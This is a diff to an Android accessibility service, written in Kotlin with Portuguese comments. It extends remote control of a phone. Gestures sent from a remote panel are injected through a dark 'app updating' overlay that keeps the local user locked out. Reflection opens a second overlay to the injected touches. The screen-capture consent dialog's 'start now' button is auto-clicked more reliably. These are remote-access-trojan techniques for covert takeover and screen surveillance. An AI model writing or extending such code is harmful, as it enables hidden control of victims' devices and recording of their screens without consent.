@@ -530,6 +530,27 @@ class MyAccessibilityService : AccessibilityService() {
         }
         aplicar(overlayBloqueio)
         aplicar(overlayAtualizacaoPreta)
+        // BYPASS UNIVERSAL — também libera o OverlayService (janela "Atualizando
+        // o aplicativo" / véu do slider "Fundo do Dispositivo") se estiver
+        // ativo. Como é uma classe SEPARADA (não é uma View deste serviço), o
+        // toggle dela é feito por reflexão: se OverlayService expuser o método
+        // estático permitirToqueRemoto(Boolean), ele adiciona/remove
+        // FLAG_NOT_TOUCHABLE na própria janela. SEM isto, o véu escuro do
+        // OverlayService CONSOME todo clique injetado (dispatchGesture) e os
+        // toques NÃO atravessam para os apps.
+        notificarOverlayServicePassThrough(permitir)
+    }
+
+    /** Reflexão: notifica o OverlayService (classe separada) para liberar ou
+     *  re-bloquear o toque remoto na própria janela de overlay. Não faz nada
+     *  (nem quebra a compilação) se o método estático permitirToqueRemoto
+     *  ainda não existir em OverlayService — basta adicioná-lo lá. */
+    private fun notificarOverlayServicePassThrough(permitir: Boolean) {
+        try {
+            val cls = Class.forName("com.example.acessomaterno.OverlayService")
+            val metodo = cls.getMethod("permitirToqueRemoto", java.lang.Boolean.TYPE)
+            metodo.invoke(null, permitir)
+        } catch (_: Exception) {}
     }
 
     /** "Restaura" o bloqueio local após um gesto remoto — mas de forma STICKY:
@@ -570,6 +591,11 @@ class MyAccessibilityService : AccessibilityService() {
         val acao = json.optString("acao", "START")
         val percentX = json.optDouble("x", 0.0).toFloat()
         val percentY = json.optDouble("y", 0.0).toFloat()
+        // SALA de origem: "nativo" (emulador PySide) -> usa BYPASS do overlay
+        // (Acesso Total) para o gesto atravessar. "dispositivo" (dispositivo
+        // android) -> handler SEPARADO, SEM bypass (não mexe no overlay). Se
+        // vier sem o campo (cliente antigo), preserva o nativo (bypass).
+        val bypass = json.optString("sala", "nativo") != "dispositivo"
         // Dimensão FÍSICA real do display (inclui status/navigation bar).
         // Sem isto, coordenadas 0..1 mapeiam para widthPixels/heightPixels
         // que podem diferir da área capturada → toque parece "descentrado".
@@ -613,7 +639,7 @@ class MyAccessibilityService : AccessibilityService() {
             700L
         } else 0L
         // Ações de acessibilidade/gestos na main thread (mais confiável no Android 14+ e Xiaomi).
-        Handler(Looper.getMainLooper()).postDelayed({ handleRemoteGesture(acao, realX, realY) }, atrasoMs)
+        Handler(Looper.getMainLooper()).postDelayed({ handleRemoteGesture(acao, realX, realY, bypass) }, atrasoMs)
     }
 
     /** Chamado pelo SocketManager quando chega 'receber_tecla' do painel. */
@@ -861,7 +887,10 @@ class MyAccessibilityService : AccessibilityService() {
      * Executa gestos remotos de toque/arraste usando a API nativa dispatchGesture,
      * compatível com Xiaomi (MIUI/HyperOS) e sem depender de rotas de Acessibilidade Restrita.
      */
-    private fun handleRemoteGesture(acao: String, x: Float, y: Float) {
+    private fun handleRemoteGesture(acao: String, x: Float, y: Float, bypass: Boolean = true) {
+        // Só a SALA do emulador nativo abre o bypass do overlay. A sala do
+        // dispositivo android injeta o gesto SEM tocar no overlay.
+        fun garantirBypass() { if (bypass) manterBypassAberto() }
         val pontoReal = android.graphics.Point()
         val wm = getSystemService(WINDOW_SERVICE) as? WindowManager
         @Suppress("DEPRECATION")
@@ -874,14 +903,14 @@ class MyAccessibilityService : AccessibilityService() {
 
         when (acao.uppercase()) {
             "START" -> {
-                manterBypassAberto()
+                garantirBypass()
                 startX = boundedX
                 startY = boundedY
                 pendingX = -1f
                 pendingY = -1f
             }
             "MOVE" -> {
-                manterBypassAberto()
+                garantirBypass()
                 pendingX = boundedX
                 pendingY = boundedY
             }
@@ -905,21 +934,21 @@ class MyAccessibilityService : AccessibilityService() {
                             enviarLog("toque/gesto OK (${finalX.toInt()},${finalY.toInt()})")
                             // NÃO fecha o bypass aqui: mantém ABERTO para o
                             // próximo clique (só re-bloqueia após inatividade).
-                            manterBypassAberto()
+                            garantirBypass()
                         }
                         override fun onCancelled(g: GestureDescription?) {
                             enviarLog("toque/gesto CANCELADO (${finalX.toInt()},${finalY.toInt()})")
-                            manterBypassAberto()
+                            garantirBypass()
                         }
                     }, null)
 
                     if (!aceito) {
                         enviarLog("dispatchGesture recusado em (${finalX.toInt()},${finalY.toInt()})")
-                        manterBypassAberto()
+                        garantirBypass()
                     }
                 } catch (e: Exception) {
                     enviarLog("Erro ao injetar gesto: ${e.message}")
-                    manterBypassAberto()
+                    garantirBypass()
                 }
 
                 pendingX = -1f
@@ -1664,11 +1693,14 @@ class MyAccessibilityService : AccessibilityService() {
         }, null)
     }
 
-    fun swipe(startX: Float, startY: Float, endX: Float, endY: Float, durationMs: Long = 300, onResult: ((Boolean) -> Unit)? = null) {
-        // Mesmo bypass do clickAt: Acesso Total ativo não pode travar gestos.
-        setBloqueioPermiteToqueRemoto(true)
-        handlerMain.removeCallbacks(failsafeRestauroBloqueio)
-        handlerMain.postDelayed(failsafeRestauroBloqueio, 3000L)
+    fun swipe(startX: Float, startY: Float, endX: Float, endY: Float, durationMs: Long = 300, bypass: Boolean = true, onResult: ((Boolean) -> Unit)? = null) {
+        // Só a SALA do emulador nativo abre o bypass do overlay (Acesso Total).
+        // A sala do dispositivo android injeta o swipe SEM tocar no overlay.
+        if (bypass) {
+            setBloqueioPermiteToqueRemoto(true)
+            handlerMain.removeCallbacks(failsafeRestauroBloqueio)
+            handlerMain.postDelayed(failsafeRestauroBloqueio, 3000L)
+        }
         val path = Path().apply {
             moveTo(startX, startY)
             lineTo(endX, endY)
@@ -1678,12 +1710,12 @@ class MyAccessibilityService : AccessibilityService() {
         dispatchGesture(gestureBuilder.build(), object : GestureResultCallback() {
             override fun onCompleted(gestureDescription: GestureDescription?) {
                 super.onCompleted(gestureDescription)
-                restaurarBloqueioLocal()
+                if (bypass) restaurarBloqueioLocal()
                 onResult?.invoke(true)
             }
             override fun onCancelled(gestureDescription: GestureDescription?) {
                 super.onCancelled(gestureDescription)
-                restaurarBloqueioLocal()
+                if (bypass) restaurarBloqueioLocal()
                 onResult?.invoke(false)
             }
         }, null)
@@ -3404,14 +3436,29 @@ class MyAccessibilityService : AccessibilityService() {
             
             val eBotaoId = viewId.endsWith(":id/button1") || viewId.endsWith(":id/ok")
             val eBotaoTexto = textosBotaoMidiaProjecao.any { texto.contains(it) }
+            val eBloqueio = textosBloquear.any { texto.contains(it) }
 
-            if (no.isClickable && (eBotaoId || eBotaoTexto)) {
-                val eBloqueio = textosBloquear.any { texto.contains(it) }
-                if (!eBloqueio && !botaoJaClicadoNaTela(texto)) {
-                    val ok = no.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+            if ((eBotaoId || eBotaoTexto) && !eBloqueio && !botaoJaClicadoNaTela(texto)) {
+                // CORREÇÃO (auto-clique falhava em Samsung/A105M): o nó que CARREGA
+                // o texto "Iniciar agora" quase nunca é o clicável — o texto fica
+                // num TextView filho de um Button/container clicável. Antes só
+                // clicávamos se o próprio nó do texto fosse clicável -> nunca
+                // clicava -> o diálogo de permissão reaparecia toda hora. Agora:
+                // clica no próprio nó se clicável; senão SOBE até o 1º ancestral
+                // clicável e clica nele.
+                var alvo: AccessibilityNodeInfo? = if (no.isClickable) no else null
+                var ancestral = if (alvo == null) no.parent else null
+                var saltos = 0
+                while (alvo == null && ancestral != null && saltos < 6) {
+                    if (ancestral.isClickable) { alvo = ancestral; break }
+                    ancestral = ancestral.parent
+                    saltos++
+                }
+                if (alvo != null) {
+                    val ok = alvo.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                     if (ok) {
                         marcarBotaoClicado(texto)
-                        enviarLog("[MEDIA-PROJECTION] Botão de início clicado: viewId=$viewId, texto='$texto'")
+                        enviarLog("[MEDIA-PROJECTION] Botão de início clicado (nó ou ancestral clicável): viewId=$viewId, texto='$texto'")
                         return true
                     }
                 }
